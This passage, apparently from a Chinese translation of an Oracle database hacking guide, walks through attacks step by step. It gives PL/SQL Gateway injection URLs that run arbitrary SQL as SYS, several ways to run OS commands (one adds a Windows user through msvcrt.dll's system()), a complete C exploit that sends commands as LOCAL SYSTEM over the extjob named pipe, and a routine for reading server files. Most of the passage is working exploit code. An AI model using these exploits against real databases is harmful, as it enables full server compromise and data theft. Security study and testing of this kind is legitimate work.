class="line">http://server.example.com/pls/dad/--&#x27;)))</span><br></pre></td></tr></table></figure><p>这将返回一个“403 Forbidden”响应——这正是现阶段所期望的。 它返回禁止，因为 OWA_MATCH 将返回 true，因为注入字符串以双减号开头。 然而，这无关紧要，因为攻击者可以在最后一个分号和最后一个双减号之间注入一个过程，确保他们以分号结束他们的注入过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))%20then%20rc__:%3D2;XXXXXXXX;--</span><br></pre></td></tr></table></figure><p>通过在 XXXXXXXX 所在的位置放置任意 SQL，攻击者可以使其执行。 由于前面提到的限制，攻击可能被证明是困难的（但并非不可能），并且存在一种更简单的方法。</p><p>首先，攻击者需要找到一个不带参数的PL/SQL过程，如下例所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JAVA_AUTONOMOUS_TRANSACTION.PUSH</span><br><span class="line">XMLGEN.USELOWERCASETAGNAMES</span><br><span class="line">PORTAL.WWV_HTP.CENTERCLOSE</span><br><span class="line">ORASSO.HOME</span><br><span class="line">WWC_VERSION.GET_HTTP_DATABASE_INFO</span><br></pre></td></tr></table></figure><p>如果攻击者发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?FOO=BAR</span><br></pre></td></tr></table></figure><p>服务器应该返回“404 File Not Found”响应，因为 orasso.home 过程不需要参数并且已经提供了参数。 但是，在返回404之前，执行了以下PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">..</span><br><span class="line">if ((owa_match.match_pattern(&#x27;orasso.home&#x27;, simple_list__,</span><br><span class="line">complex_list__,</span><br><span class="line">true))) then</span><br><span class="line"> rc__ := 2;</span><br><span class="line">else</span><br><span class="line"> null;</span><br><span class="line"> orasso.wpg_session.init();</span><br><span class="line"> orasso.home(FOO=&gt;:FOO);</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure><p>请注意攻击者的查询字符串中是否存在 FOO。 他们可以滥用它来运行任意 SQL。 首先，他们需要关闭括号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);--=BAR</span><br></pre></td></tr></table></figure><p>这将导致执行以下 PL/SQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orasso.home();--=&gt;:);--);</span><br></pre></td></tr></table></figure><p>请注意，双减号 (–) 之后的所有内容都被视为注释。</p><p>此请求将导致内部服务器错误，因为不再使用绑定变量之一，因此攻击者需要将其添加回来。 碰巧，正是这个绑定变量是运行任意 PL/SQL 的关键。</p><p>目前，他们可以使用 HTP.PRINT 打印 BAR，并将所需的绑定变量添加为：1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR</span><br></pre></td></tr></table></figure><p>这应该在 HTML 中返回一个带有“BAR”字样的 200。 这里发生的事情是等号之后的所有内容（在本例中为 BAR）都是插入到绑定变量中的数据。</p><p>使用相同的技术还可以再次访问 owa_util：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS</span><br></pre></td></tr></table></figure><p>为了执行任意 SQL，包括 DML 和 DDL 语句，攻击者插入立即执行：1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual</span><br></pre></td></tr></table></figure><p>请注意，不会显示输出。 这可以用来利用 SYS 拥有的任何 PL/SQL 注入错误，从而使攻击者能够完全控制后端数据库服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1</span><br><span class="line">;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20</span><br><span class="line">BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES</span><br><span class="line">(&#x27;INDEX_NAME&#x27;,&#x27;INDEX_SCHEMA&#x27;,&#x27;DBMS_OUTPUT.PUT_LINE(:p1);</span><br><span class="line">EXECUTE%20IMMEDIATE%20&#x27;&#x27;CREATE%20OR%20REPLACE%20PUBLIC%20SYNONYM%20BREAK</span><br><span class="line">ABLE%20FOR%20SYS.BREAKABLE&#x27;&#x27;;END;--&#x27;,&#x27;SYS&#x27;,1,&#x27;VER&#x27;,0);END;</span><br></pre></td></tr></table></figure><p>截至 2005 年 11 月 25 日，此漏洞仍未修补且可利用。 假设这将在下一个重要补丁更新中修补：</p><ul><li><a href="http://www.oracle.com/technology/deploy/security/alerts.htm">http://www.oracle.com/technology/deploy/security/alerts.htm</a> </li></ul><p>当然，可能没有必要绕过 PL/SQL 排除列表。 例如，在 Oracle 9x 数据库服务器中，CTXSYS 用户是 DBA，CTXSYS 拥有的许多 PL/SQL 包都容易受到 SQL 注入的影响——例如 DRILOAD 包。 这个包有一个过程——即 VALIDATE_STMT——它基本上接受用户提供的查询并执行它。 这可能会在网络上被滥用。 这里要注意的一件事是非选择 SQL 请求可能看起来不起作用。 这是因为当您调用 VALIDATE_STMT 过程时，如果您没有进行选择，该过程将返回以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ERROR at line 1:</span><br><span class="line">ORA-06510: PL/SQL: unhandled user-defined exception</span><br><span class="line">ORA-06512: at &quot;CTXSYS.DRILOAD&quot;, line 42</span><br><span class="line">ORA-01003: no statement parsed</span><br><span class="line">ORA-06512: at line 1</span><br></pre></td></tr></table></figure><p>这将发送回 Web 服务器，因此 Web 服务器返回“404 文件未找到”响应。 测试是否可以获得访问权限，请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/CTXSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL</span><br></pre></td></tr></table></figure><p>应该返回一个带有 200 响应的空 HTML 页面。 如果是这样，那么以下内容也应该有效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=CREATE+OR+REPLACE+PROCEDURE+WEBTEST+AS+BEGIN+HTP.PRINT(&#x27;hello&#x27;);+END;</span><br></pre></td></tr></table></figure><p>这应该返回 404，但它会在 CTXSYS 模式中创建一个名为 WEBTEST 的包。</p><p>请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+EXECUTE+ON+WEBTEST+TO+PUBLIC</span><br></pre></td></tr></table></figure><p>授予 PUBLIC 对 WEBTEST 过程的执行权限，并请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad//ctxsys.webtest</span><br></pre></td></tr></table></figure><p>返回“Hello”。 这里发生了什么？ 我们的第一个请求创建了一个名为 WEBTEST 的过程，它使用 HTP.PRINT 写出“hello”。 此过程由 CTXSYS 创建并拥有。 第二个请求授予 PUBLIC 对 WEBTEST 过程的执行权限。 最后，我们可以称之为——最后一个请求。 从中可以看出整个攻击和漏洞的危险程度。</p><h2 id="执行操作系统命令"><a href="#执行操作系统命令" class="headerlink" title="执行操作系统命令"></a>执行操作系统命令</h2><p>Oracle 提供了许多用于从数据库服务器运行操作系统命令的工具——有些是故意的，有些是“黑客”。 命令可以通过 PL/SQL、Java 和默认包执行，并通过使用 ALTER SYSTEM 命令操作服务器参数来执行。 不用说，运行操作系统命令需要相关的高级权限，但前面的章节已经表明，获得这样的权限并不是一件困难的事。</p><h3 id="通过PL-SQL运行系统命令"><a href="#通过PL-SQL运行系统命令" class="headerlink" title="通过PL/SQL运行系统命令"></a>通过PL/SQL运行系统命令</h3><p>开发人员可以通过创建一个共享对象（动态链接库， DLL）来扩展 PL/SQL，该对象在函数中包含他们想要实现的代码。 开发人员将使用 CREATE LIBRARY 语句向 Oracle 服务器注册该库。 一旦注册，就可以调用该函数。 攻击者可以利用这种行为来运行操作系统命令。 他们会通过在 Unix 系统上注册 libc 或在 Windows 系统上注册 msvcrt.dll 然后调用 system() 函数来做到这一点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ * First register msvcrt.dll/libc */</span><br><span class="line">CREATE OR REPLACE LIBRARY exec_shell AS &#x27;C:\winnt\system32\msvcrt.dll&#x27;;</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">/* Now create the procedure */</span><br><span class="line">CREATE OR REPLACE PROCEDURE oraexec (cmdstring IN CHAR)</span><br><span class="line">IS EXTERNAL</span><br><span class="line">NAME &quot;system&quot;</span><br><span class="line">LIBRARY exec_shell</span><br><span class="line">LANGUAGE C;</span><br><span class="line">/</span><br><span class="line">/* Once created now run commands */</span><br><span class="line">EXEC ORAEXEC(&#x27;NET USER MYACCOUNT PASSWORD /ADD&#x27;);</span><br></pre></td></tr></table></figure><p>当执行ORAEXEC 过程时，Oracle 连接到TNS Listener 并请求访问EXTPROC。 EXTPROC 是 Oracle 用于运行外部过程的程序。侦听器执行 EXTPROC，然后将命名管道上的连接传递给数据库服务器。然后，数据库服务器指示 EXTPROC 加载 msvcrt.dll 库并执行 system() 函数，将命令“NET USER MYACCOUNT PASSWORD /ADD”传递给它。这告诉操作系统添加一个名为 MYACCOUNT 的新用户。因为默认情况下 Oracle 在 Windows 上作为 LOCAL SYSTEM 运行，所以执行起来应该没有任何问题。然后，攻击者当然可以将 MYACCOUNT 添加到本地管理员组。 Oracle 的许多安全安装将禁用外部程序；对于那些需要启用外部程序的程序，它们已被配置为以低权限用户身份运行。</p><p>更高版本的 Oracle 将外部库的位置限制在 ORACLE_HOME\bin 目录中。然而，这可以通过使用目录遍历攻击来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE LIBRARY exec_shell AS</span><br><span class="line">&#x27;$ORACLE_HOME\bin\..\..\..\..\..\winnt\system32\msvcrt.dll&#x27;;</span><br><span class="line"></span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>Oracle 已经修复了这个缺陷，因此有两种使用 PL/SQL 执行 OS 命令的方法。 首先，可以使用 UTL_FILE 包（参见第 11 章“访问文件系统”）将 DLL 放入 ORACLE_HOME/bin 目录，或者设置 EXTPROC_DLLS 环境变量。 在无法运行 OS 命令的情况下，第二种方法更难在 Oracle 内部执行，因此首选前一种方法。</p><h3 id="通过Java运行操作系统命令"><a href="#通过Java运行操作系统命令" class="headerlink" title="通过Java运行操作系统命令"></a>通过Java运行操作系统命令</h3><p>通过 Java 运行 OS 命令不依赖于外部过程，命令以 Oracle 用户的权限执行。 一旦创建了 Java 源代码，它就会被包装在一个 PL/SQL 过程中，然后可以执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVACMD&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVACMD</span><br><span class="line">&#123;</span><br><span class="line"> public static void execCommand (String command) throws IOException</span><br><span class="line"> &#123;</span><br><span class="line">     Runtime.getRuntime().exec(command);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVACMDPROC (p_command IN VARCHAR2)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVACMD.execCommand (java.lang.String)&#x27;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">exec javacmdproc(&#x27;cmd.exe /c dir &gt; c:\orajava.txt&#x27;);</span><br></pre></td></tr></table></figure><p>执行 OS 命令所需的 Java 权限如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission(  &#x27;SCOTT&#x27;, &#x27;SYS:java.io.FilePermission&#x27;,&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;,&#x27;execute&#x27;);</span><br><span class="line">exec dbms_java.grant_permission(  &#x27;SCOTT&#x27;,&#x27;SYS:java.lang.RuntimePermission&#x27;, &#x27;writeFileDescriptor&#x27;, &#x27;&#x27;);</span><br><span class="line">exec dbms_java.grant_permission(  &#x27;SCOTT&#x27;,&#x27;SYS:java.lang.RuntimePermission&#x27;, &#x27;readFileDescriptor&#x27;, &#x27;&#x27;);</span><br></pre></td></tr></table></figure><h3 id="通过DBMS-SCHEDULER运行系统命令"><a href="#通过DBMS-SCHEDULER运行系统命令" class="headerlink" title="通过DBMS_SCHEDULER运行系统命令"></a>通过DBMS_SCHEDULER运行系统命令</h3><p>DBMS_SCHEDULER 是 Oracle 10g 中引入并附带的 PL/SQL 包。 创建此包的目的是使 DBA 能够将预定义的包和 shell 脚本（例如 Windows 批处理文件和 Unix sh 文件）的执行安排为“作业”。 使用 DBMS_SCHEDULER 成功提交作业需要 CREATE JOB 权限。 不允许执行程序。 但是，存在一个允许绕过此限制的错误。 通过在要运行的程序的名称中嵌入诸如与号 (&amp;) 或管道 (∥) 之类的 shell 元字符，可以执行程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_PROGRAM (</span><br><span class="line">program_name=&gt; &#x27;MyCmd&#x27;,</span><br><span class="line">program_type=&gt; &#x27;EXECUTABLE&#x27;,</span><br><span class="line">-- Use the ampersand to break out</span><br><span class="line">program_action =&gt;</span><br><span class="line">&#x27;c:/foo.bat&#x27;||chr(38)||&#x27;dir&gt;c:/oraoutput.txt&#x27;||chr(38)||&#x27;c:/foo.bat&#x27;,</span><br><span class="line">enabled=&gt; TRUE,</span><br><span class="line">comments=&gt; &#x27;Run a command using shell metacharacters.&#x27;</span><br><span class="line"> );</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_JOB (</span><br><span class="line">   job_name=&gt; &#x27;X&#x27;,</span><br><span class="line">   program_name=&gt; &#x27;MyCmd&#x27;,</span><br><span class="line">   repeat_interval=&gt; &#x27;FREQ=SECONDLY;INTERVAL=10&#x27;,</span><br><span class="line">   enabled=&gt; TRUE,</span><br><span class="line">   comments=&gt; &#x27;Every 10 seconds&#x27;);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>如果要通过 DBMS_SCHEDULER 运行 OS 命令，则必须运行 OracleJobSchedulerSID 服务。 如果没有，则调度程序将生成错误。</p><h3 id="通过Job-Scheduler运行系统命令"><a href="#通过Job-Scheduler运行系统命令" class="headerlink" title="通过Job Scheduler运行系统命令"></a>通过Job Scheduler运行系统命令</h3><p>作业调度程序作为外部进程实现 - extjob。 在 Windows 上，它以 LOCAL SYSTEM 操作系统帐户的权限运行。 它侦听名为“orcljsex<SID>”的命名管道，其中 SID 是数据库系统标识符。 当 Job Scheduler 在这个命名管道上接收到一个命令时，它只是尝试执行它。 因此，任何可以连接到命名管道的人，无论是在本地还是使用 SMB 跨网络，都可以作为 LOCAL SYSTEM 运行命令并完全破坏服务器：</SID></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">/* Oracle External Job Remote Command Exploit</span><br><span class="line">Oracle&#x27;s extjob.exe listens on a named pipe &quot;orcljsex&lt;SID&gt; and executes</span><br><span class="line">commands</span><br><span class="line">sent through it.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line"> char buffer[540]=&quot;&quot;;</span><br><span class="line"> char NamedPipe[260]=&quot;\\\\&quot;;</span><br><span class="line"> HANDLE rcmd=NULL;</span><br><span class="line"> char *ptr = NULL;</span><br><span class="line"> int len =0;</span><br><span class="line"> DWORD Bytes = 0;</span><br><span class="line"></span><br><span class="line"> if(argc !=4)</span><br><span class="line"> &#123;</span><br><span class="line">  printf(&quot;\n\tOracle External Job Remote Command Exploit.\n\n&quot;);</span><br><span class="line">  printf(&quot;\tUsage: oraextjob target SID \&quot; command\&quot;\n&quot;);</span><br><span class="line">  printf(&quot;\n\tDavid Litchfield\n\t(david@ngssoftware.com)\n\t1st October</span><br><span class="line">2006\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> strncat(NamedPipe,argv[1],100);</span><br><span class="line"> strcat(NamedPipe,&quot;\\pipe\\orcljsex&quot;);</span><br><span class="line"> len = strlen(NamedPipe);</span><br><span class="line"> if(len&gt;256)</span><br><span class="line">                                          return printf(&quot;Too long...\n&quot;);</span><br><span class="line"> len = 256 - len;</span><br><span class="line">// tack on the SID</span><br><span class="line"> strncat(NamedPipe,argv[2],len);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> // Open the named pipe</span><br><span class="line"> rcmd =</span><br><span class="line">CreateFile(NamedPipe,GENERIC_WRITE|GENERIC_READ,0,NULL,OPEN_EXISTING,0,N</span><br><span class="line">ULL);</span><br><span class="line"> if(rcmd == INVALID_HANDLE_VALUE)</span><br><span class="line">  return printf(&quot;Failed to open pipe %s. Error</span><br><span class="line">%d.\n&quot;,NamedPipe,GetLastError());</span><br><span class="line"></span><br><span class="line"> // Send command</span><br><span class="line"> len = WriteFile(rcmd,argv[3],strlen(argv[3]),&amp;Bytes,NULL);</span><br><span class="line"></span><br><span class="line"> if(!len)</span><br><span class="line">  return printf(&quot;Failed to write to %s. Error</span><br><span class="line">%d.\n&quot;,NamedPipe,GetLastError());</span><br><span class="line"></span><br><span class="line"> // Read results</span><br><span class="line"> while(len)</span><br><span class="line"> &#123;</span><br><span class="line">  len = ReadFile(rcmd,buffer,530,&amp;Bytes,NULL);</span><br><span class="line">  printf(&quot;%s&quot;,buffer);</span><br><span class="line"></span><br><span class="line">  ZeroMemory(buffer,540);</span><br><span class="line"> &#125;</span><br><span class="line">CloseHandle(rcmd);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过ALTER-SYSTEM运行系统命令"><a href="#通过ALTER-SYSTEM运行系统命令" class="headerlink" title="通过ALTER SYSTEM运行系统命令"></a>通过ALTER SYSTEM运行系统命令</h3><p>Oracle 从未打算将其作为运行命令的正确方法，但它运行良好。 在 Oracle 9i 中，可以操纵 Oracle 编译本机 PL/SQL 程序的方式。 这是通过提供 make 程序的名称来完成的。 显然，这可以被滥用来运行操作系统命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ALTER SYSTEM SET plsql_native_make_utility = &#x27;cmd.exe /C dir &gt;</span><br><span class="line">c:\ooops.txt &amp;&#x27;;</span><br><span class="line">ALTER SYSTEM SET plsql_native_make_file_name = &#x27; foo&#x27;;</span><br><span class="line">ALTER SYSTEM SET plsql_native_library_dir=&#x27;bar&#x27;;</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE ohoh AS</span><br><span class="line">BEGIN</span><br><span class="line">NULL;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">show errors</span><br></pre></td></tr></table></figure><p>当 Oracle 编译 ohoh 过程时，Oracle 执行以下操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /C dir &gt; c:\ooops.txt &amp; -f foo bar/RUN_CMD__SYSTEM__0.DLL</span><br></pre></td></tr></table></figure><p>Oracle 10g 弃用了 plsql_native_make_utility 参数。</p><h2 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h2><p>一旦服务器遭到入侵，攻击者可能想要探索文件系统——事实上，大量 Oracle 文件包含用户 ID 和密码，因此攻击者可能能够提升权限，如果他们还没有这样做的话。 可以使用 PL/SQL 或 Java 来访问文件系统。 由于对文件系统的访问是通过用于运行服务器的帐户的权限实现的，因此攻击者可以获得对数据库数据文件的直接原始访问。 因此，可以完全绕过所有数据库强制访问控制。 您已经在第 8 章“击败虚拟专用数据库”中看到了这一点。</p><h3 id="使用UTL-FILE-包访问文件系统"><a href="#使用UTL-FILE-包访问文件系统" class="headerlink" title="使用UTL_FILE 包访问文件系统"></a>使用UTL_FILE 包访问文件系统</h3><p>UTL_FILE 包使 Oracle 用户能够读取和写入文件系统。 如前所述，对文件系统上的文件的访问是通过 Oracle 用户的权限实现的 - 因此该用户可以读取或写入的任何内容都可以被其他任何人读取或写入。 以下 PL/SQL 代码可用于从文件系统读取文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE PROCEDURE READ_FILE(DIRNAME VARCHAR2, FNAME VARCHAR2)</span><br><span class="line">AS</span><br><span class="line">invalid_path EXCEPTION;</span><br><span class="line">access_denied EXCEPTION;</span><br><span class="line">PRAGMA EXCEPTION_INIT(invalid_path, -29280);</span><br><span class="line">PRAGMA EXCEPTION_INIT(access_denied, -29289);</span><br><span class="line">FD UTL_FILE.FILE_TYPE;</span><br><span class="line">BUFFER VARCHAR2(260);</span><br><span class="line">BEGIN</span><br><span class="line"></span><br><span class="line">        EXECUTE IMMEDIATE &#x27;CREATE OR REPLACE DIRECTORY RW_FILE AS &#x27;&#x27;&#x27; ||</span><br><span class="line">DIRNAME || &#x27;&#x27;&#x27;&#x27;;</span><br><span class="line">        FD := UTL_FILE.FOPEN(&#x27;RW_FILE&#x27;,FNAME,&#x27;r&#x27;);</span><br><span class="line">        DBMS_OUTPUT.ENABLE(1000000);</span><br><span class="line">        LOOP</span><br><span class="line">                UTL_FILE.GET_LINE(FD,BUFFER,254);</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(BUFFER);</span><br><span class="line">        END LOOP;</span><br><span class="line">        EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line"></span><br><span class="line">EXCEPTION WHEN invalid_path THEN</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;File location or path is</span><br><span class="line">invalid.&#x27;);</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">        WHEN access_denied THEN</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;Access is denied.&#x27;);</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">        WHEN NO_DATA_FOUND THEN</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;End of file.&#x27;);</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">        WHEN OTHERS THEN</span><br><span class="line">                IF (UTL_FILE.IS_OPEN(FD) = TRUE) THEN</span><br><span class="line">                        UTL_FILE.FCLOSE(FD);</span><br><span class="line">                END IF;</span><br><span class="line">                DBMS_OUTPUT.PUT_LINE(&#x27;There was an error.&#x27;);</span><br><span class="line">                EXECUTE IMMEDIATE &#x27;DROP DIRECTORY RW_FILE&#x27;;</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line">EXEC READ_FILE(&#x27;C:\&#x27;,&#x27;boot.ini&#x27;);</span><br></pre></td></tr></table></figure><h3 id="使用Java访问文件系统"><a href="#使用Java访问文件系统" class="headerlink" 